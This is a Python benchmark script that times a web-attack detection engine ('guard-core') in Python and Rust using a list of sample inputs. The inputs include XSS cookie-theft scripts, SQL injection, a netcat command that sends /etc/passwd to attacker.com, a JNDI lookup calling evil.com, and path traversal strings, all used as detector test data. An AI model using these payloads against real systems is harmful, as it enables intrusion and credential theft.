#!/usr/bin/env python3
"""Benchmark guard-core detection engine.

Usage:
    python scripts/benches/bench.py              # Python-only
    python scripts/benches/bench.py --compare    # Python vs Rust (maturin)
"""

import argparse
import asyncio
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "guard-core"))

from guard_core.detection_engine.preprocessor import ContentPreprocessor
from guard_core.detection_engine.semantic import SemanticAnalyzer

PAYLOADS = {
    "clean_get": "GET /api/v1/users?page=1&limit=20 HTTP/1.1",
    "clean_json": '{"username":"john","email":"john@example.com","age":30}',
    "xss_basic": "<script>alert(document.cookie)</script>",
    "xss_bypass": f"<scr\u200bipt>al\u200cert(1)</sc\u200dript>",
    "sqli_union": "1' OR '1'='1' UNION SELECT username, password FROM users--",
    "sqli_encoded": "1' %55NION %53ELECT * FROM users WHERE '1'='1",
    "cmd_injection": "test; cat /etc/passwd | nc attacker.com 9999",
    "path_traversal": "../../../../../../etc/passwd",
    "template_injection": "{{7*7}} ${jndi:ldap://evil.com/a} {%if%}evil{%endif%}",
    "double_encoded": "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
    "mixed_attack": "<script>eval('alert(1)')</script> UNION SELECT * FROM users",
}

BATCH = [
    f"GET /api/v1/resource/{i}" if i % 5 == 0
    else f"<script>alert({i})</script>" if i % 5 == 1
    else f"' OR 1=1 UNION SELECT {i} FROM users--" if i % 5 == 2
    else f"../../etc/passwd{i}" if i % 5 == 3
    else f"normal request body {i}"
    for i in range(100)
]

N = 1000


def median_ns(func):
    times = []
    
    for _ in range(N):
        start = time.perf_counter_ns()
        func()
        times.append(time.perf_counter_ns() - start)
    
    times.sort()
    return times[N // 2]


async def median_ns_async(coro_factory):
    times = []
    
    for _ in range(N):
        start = time.perf_counter_ns()
        await coro_factory()
        times.append(time.perf_counter_ns() - start)
    
    times.sort()
    return times[N // 2]


async def bench_python():
    preprocessor = ContentPreprocessor(max_content_length=10000)
    analyzer = SemanticAnalyzer()
    results = {}

    for name, payload in PAYLOADS.items():
        async def pipeline(p=payload):
            preprocessed = await preprocessor.preprocess(p)
            analysis = analyzer.analyze(preprocessed)
            return analyzer.get_threat_score(analysis)

        results[name] = await median_ns_async(pipeline)

    async def throughput():
        for p in BATCH:
            preprocessed = await preprocessor.preprocess(p)
            analysis = analyzer.analyze(preprocessed)
            analyzer.get_threat_score(analysis)

    results["throughput_100_mixed"] = await median_ns_async(throughput)
    return results


def bench_rust():
    import guard_core_rs

    results = {}
    for name, payload in PAYLOADS.items():
        def pipeline(p=payload):
            preprocessed = guard_core_rs.preprocess(p)
            return guard_core_rs.get_threat_score(preprocessed)

        results[name] = median_ns(pipeline)

    def throughput():
        for p in BATCH:
            preprocessed = guard_core_rs.preprocess(p)
            guard_core_rs.get_threat_score(preprocessed)

    results["throughput_100_mixed"] = median_ns(throughput)
    return results


async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--compare", action="store_true", help="include Rust (maturin) comparison")
    args = parser.parse_args()

    py = await bench_python()

    if args.compare:
        rs = bench_rust()
        print(f"\n{'Payload':<30} {'Python (us)':>12} {'Rust+PyO3 (us)':>15} {'Speedup':>10}")
        print("-" * 70)
        for name in py:
            py_us = py[name] / 1000
            rs_us = rs[name] / 1000
            speedup = py[name] / rs[name] if rs[name] > 0 else float("inf")
            print(f"{name:<30} {py_us:>12,.1f} {rs_us:>15,.1f} {speedup:>9.0f}x")

        output = [{"name": k, "python_ns": py[k], "rust_maturin_ns": rs[k], "speedup": round(py[k] / rs[k], 1)} for k in py]
    else:
        print(f"\n{'Payload':<30} {'Median (ns)':>12} {'Median (us)':>12}")
        print("-" * 57)
        for name, ns in py.items():
            print(f"{name:<30} {ns:>12,} {ns / 1000:>12,.1f}")

        output = [{"name": k, "python_ns": v} for k, v in py.items()]

    out_path = Path("scripts/benches/bench_results.json")
    out_path.write_text(json.dumps(output, indent=2))
    print(f"\nResults saved to {out_path}")


if __name__ == "__main__":
    asyncio.run(main())
